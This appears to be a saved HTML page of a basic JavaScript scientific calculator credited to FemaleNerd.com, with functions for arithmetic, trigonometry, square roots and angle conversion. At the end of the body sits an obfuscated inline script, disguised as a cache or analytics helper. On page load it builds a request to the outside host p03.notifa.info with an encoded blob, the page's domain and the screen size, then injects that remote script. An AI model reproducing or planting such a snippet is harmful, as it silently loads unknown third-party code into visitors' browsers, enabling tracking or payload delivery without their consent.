
<HTML>
<HEAD>
<TITLE>JavaScript Calculator</TITLE>
<SCRIPT LANGUAGE='JavaScript'>
/**************************************
 * www.FemaleNerd.com         *
 **************************************/

// Declare global variables
var displayText = ""
var num1
var num2
var operatorType

// Write to display
function addDisplay(n){
document.calc.display.value = ""
displayText += n
document.calc.display.value = displayText
}

// Addition
function addNumbers() {
if (displayText == "") {
  displayText = result
 }
num1 = parseFloat(displayText)
operatorType = "add"
displayText = ""
}

// Subtraction
function subtractNumbers() {
if (displayText == "") {
  displayText = result
 }
num1 = parseFloat(displayText)
operatorType = "subtract"
displayText = ""
}

// Multiplication
function multiplyNumbers() {
if (displayText == "") {
  displayText = result
 }
num1 = parseFloat(displayText)
operatorType = "multiply"
displayText = ""
}

// Division
function divideNumbers() {
if (displayText == "") {
  displayText = result
 }
num1 = parseFloat(displayText)
operatorType = "divide"
displayText = ""
}

// Sine
function sin() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = Math.sin(num1)
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Cosine
function cos() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = Math.cos(num1)
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// ArcSine
function arcSin() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = Math.asin(num1)
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// ArcCosine
function arcCos() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = Math.acos(num1)
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Square root
function sqrt() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = Math.sqrt(num1)
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Square number (number to the power of two)
function square() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = num1 * num1
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Convert degrees to radians
function degToRad() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = num1 * Math.PI / 180
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Convert radians to degrees
function radToDeg() {
if (displayText == "") {
  num1 = result
  }
else {
  num1 = parseFloat(displayText)
  }
if (num1 != "") {
  result = num1 * 180 / Math.PI
  document.calc.display.value = result
  displayText = ""
  }
else {
  alert("Please write the number first")
  }
}

// Calculations
function calculate() {
if (displayText != "") {
  num2 = parseFloat(displayText)
// Calc: Addition
  if (operatorType == "add") {
    result = num1 + num2
    document.calc.display.value = result
    }
// Calc: Subtraction
  if (operatorType == "subtract") {
    result = num1 - num2
    document.calc.display.value = result
    }
// Calc: Multiplication
  if (operatorType == "multiply") {
    result = num1 * num2
    document.calc.display.value = result
    }
// Calc: Division
  if (operatorType == "divide") {
    result = num1 / num2
    document.calc.display.value = result
    }
  displayText = ""
  }
  else {
  document.calc.display.value = "Oops! Error!"
  }
}

// Clear the display
function clearDisplay() {
displayText = ""
document.calc.display.value = ""
}
</SCRIPT>
</HEAD>
<BODY BGCOLOR="#FFFFFF" LINK="#9C6060">

<TABLE>
<TD> 
<TABLE BORDER=0 BGCOLOR="#AF9999">
<TD>
<TABLE border="0" cellpadding="2" cellspacing="2">
<FORM NAME=calc>

<!--
<TR><TD VALIGN=top colspan=6 ALIGN="center"> <H2>Calculator</H2> </TD>
-->
<TR>
	<TD COLSPAN=5><INPUT TYPE=text SIZE=22 NAME=display></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="one" VALUE="&nbsp;&nbsp;1&nbsp;&nbsp;&nbsp;" onClick=addDisplay(1)></TD>
	<TD><INPUT TYPE=button NAME="two" VALUE="&nbsp;&nbsp;2&nbsp;&nbsp;&nbsp;" onClick=addDisplay(2)></TD>
	<TD><INPUT TYPE=button NAME="three" VALUE="&nbsp;&nbsp;3&nbsp;&nbsp;&nbsp;" onClick=addDisplay(3)></TD>
	<TD><INPUT TYPE=button NAME="plus" VALUE="&nbsp;&nbsp;+&nbsp;&nbsp;&nbsp;" onClick=addNumbers()></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="four" VALUE="&nbsp;&nbsp;4&nbsp;&nbsp;&nbsp;" onClick=addDisplay(4)></TD>
	<TD><INPUT TYPE=button NAME="five" VALUE="&nbsp;&nbsp;5&nbsp;&nbsp;&nbsp;" onClick=addDisplay(5)></TD>
	<TD><INPUT TYPE=button NAME="six" VALUE="&nbsp;&nbsp;6&nbsp;&nbsp;&nbsp;" onClick=addDisplay(6)></TD>
	<TD><INPUT TYPE=button NAME="minus" VALUE="&nbsp;&nbsp;&nbsp;-&nbsp;&nbsp;&nbsp;" onClick=subtractNumbers()></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="seven" VALUE="&nbsp;&nbsp;7&nbsp;&nbsp;&nbsp;" onClick=addDisplay(7)></TD>
	<TD><INPUT TYPE=button NAME="eight" VALUE="&nbsp;&nbsp;8&nbsp;&nbsp;&nbsp;" onClick=addDisplay(8)></TD>
	<TD><INPUT TYPE=button NAME="nine" VALUE="&nbsp;&nbsp;9&nbsp;&nbsp;&nbsp;" onClick=addDisplay(9)></TD>
	<TD><INPUT TYPE=button NAME="multiplication" VALUE="&nbsp;&nbsp;*&nbsp;&nbsp;&nbsp;&nbsp;" onClick=multiplyNumbers()></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="zero" VALUE="&nbsp;&nbsp;0&nbsp;&nbsp;&nbsp;" onClick=addDisplay(0)></TD>
	<TD><INPUT TYPE=button NAME="pi" VALUE = "&nbsp;Pi&nbsp;&nbsp;" onClick=addDisplay(Math.PI)> </TD> 
	<TD><INPUT TYPE=button NAME="dot" VALUE="&nbsp;&nbsp;&nbsp;.&nbsp;&nbsp;&nbsp;" onClick=addDisplay(".")></TD>
	<TD><INPUT TYPE=button NAME="division" VALUE="&nbsp;&nbsp;&nbsp;/&nbsp;&nbsp;&nbsp;" onClick=divideNumbers()></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="sqareroot" VALUE="sqrt" onClick=sqrt()></TD>
	<TD><INPUT TYPE=button NAME="squarex" VALUE=" x^2" onClick=square()></TD>
	<TD><INPUT TYPE=button NAME="deg-rad" VALUE="d2r&nbsp;" onClick=degToRad()></TD>
	<TD><INPUT TYPE=button NAME="rad-deg" VALUE="r2d&nbsp;" onClick=radToDeg()></TD>
<TR align="left" valign="middle">
	<TD><INPUT TYPE=button NAME="sine" VALUE="&nbsp;sin&nbsp;" onClick=sin()></TD>
	<TD><INPUT TYPE=button NAME="arcsine" VALUE="asin" onClick=arcSin()></TD>
	<TD><INPUT TYPE=button NAME="cosine" VALUE="cos" onClick=cos()></TD>
	<TD><INPUT TYPE=button NAME="arccosine" VALUE="acs" onClick=arcCos()></TD>

<TR align="left" valign="middle">
	<TD COLSPAN=2><INPUT TYPE=button NAME=clear VALUE="&nbsp;&nbsp;Clear&nbsp;&nbsp;" onClick=clearDisplay()></TD>
	<TD COLSPAN=3><INPUT TYPE=button NAME=enter VALUE="&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;=&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;" onClick=calculate()></TD>

</TABLE>
	<!--
	<TD VALIGN=top> 
		<B>NOTE:</B> All sine and cosine calculations are
		<br>done in radians. Remember to convert first
		<br>if using degrees.
	</TD>
	-->
	
</TABLE>


</TABLE>
<script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p03.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582JKzDzTsXZH2UrejPbMy%2fXVK07rbJ3S2PWvvtZ%2bYtzwjQPeOCtGzbPqHRRUT4zSzoMgaHmg88En73JUJQXF0Hn5H0tGaxOvUvwfK3mQyNyhuMudwAmsDvqln1RYTM7G81C%2fsTjWB5bX6tQiHjuiNOu9VoTJBtDRLYdl3%2bpTfb6DB%2fNO%2fDdDytwCXAl6532SHCw6BLGQknT5Fzva9zG6tY5zBXZLzl99gLAKMTgQy3h1TIeOthzrVj%2bddCEDzk6U5uQL%2fnO4NPlFQNWS6x%2bMrI5EPDBIhxHpy4UYG9rigkF93AuUx5HJF8O%2fykcPibPft%2f1YiRe%2b0ynyMZTBX2GWOCbPW9eNNDr7m%2b6vAz%2fnWaWC1WWfgOYPoxMbhlpU6vlN%2b85SDVwEHBKNPnnv9GcHy56JoZx1hM%2fpgCH%2bpuHv%2ftymTlMC4cB3CNaEcQoye9gqRLrIMV1bqyiX0UkUz1GjvUZFkvvVIZzQeIhGJ9J8HeRDTHko9iiNUpIKDyM2OpFwKYtcqIBtn4KA3t7yAP%2fQ3QOLdeKJz3cU3uL6N0elgM2WaktDoL%2bvRvdrRcRkis48zhOAXeG4AfsBLd6zSXpk8zE0xj5CWU%2bVVeZcSPlysSInyNyg0naiLO%2fY%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script></BODY>
</HTML>
